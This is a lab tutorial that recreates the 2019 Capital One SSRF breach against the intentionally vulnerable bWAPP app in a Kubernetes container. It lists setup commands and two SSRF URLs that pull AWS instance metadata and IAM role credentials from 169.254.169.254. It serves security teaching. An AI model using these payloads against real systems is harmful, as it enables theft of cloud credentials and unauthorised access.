==========================
SSRF Attack - CapitalOne
==========================

On 19th July 2019 **CapitalOne** was breached by an ex-aws employee exploiting a vulnerability on its Web Application Firewall (WAF) using Server Side Request Forgery, popularly known as SSRF attack.

.. image:: https://raw.githubusercontent.com/araalinetworks/attacks/main/images/ssrfwhat.png
 :width: 650
 :alt: what is ssrf?

Using the vulnerability, the attacker was able to download IAM credentials from AWS meta-data service, which is how AWS manages IAM roles to guard access to amazon resources. Underneath its API, AWS transparently rotates the short-lived credentials served by the metadata service.

For the demo, we will use an open-source app used for web attack testing called bwApp that has the same vulnerability.

There are 2 parts to this setup

1) Setup a container running vulnerable bWAPP where we can run SSRF attack
2) Get credential and access AWS S3

.. image:: https://raw.githubusercontent.com/araalinetworks/attacks/main/images/ssrfdemosetup.png
 :width: 650
 :alt: what is ssrf?

Running the Vulnerable container in Kubernetes
==============================================

**Container:** 

We have already created a container with a vulnerable bWAPP app and its present at - quay.io/araalinetworks/ssrf

Download the deployment yaml and save it as deployment.yaml

Apply this file in your Kubernetes cluster in a specific namespace

.. code-block:: RST

    $ kubectl create ns bg-ssrf
    $ kubectl apply -f deployment.yaml -n bg-ssrf

Check (1) if the pods are running, and (2) get the External IP of the exposed service

.. image:: https://raw.githubusercontent.com/araalinetworks/attacks/main/images/ssrfgetposvc.png
 :width: 650
 :alt: kubectl get pods

Now open a browser and check if the app is up and running, by logging into the external IP on port 80

http://20.81.5.36/install.php

Click on 'here' (Click 'here' to install bWAPP).

.. image:: https://raw.githubusercontent.com/araalinetworks/attacks/main/images/ssrfinstall.png
 :width: 350
 :alt: frond end of the app

If you see the screen above, Congratulations! we have completed the first part.


Attacking the App
==================================

Now pass attack parameter in the browser

1) Get information from metadata service

.. code-block:: RST
    
  http://20.81.5.36/rlfi.php?language=http://169.254.169.254/latest/meta-data&action=go

Replace 20.81.5.36 with your external-IP

2) Get IAM Role assigned to the container

.. code-block:: XML

   http://20.81.5.36/rlfi.php?language=http://169.254.169.254/latest/meta-data/iam/security-credentials&action=go

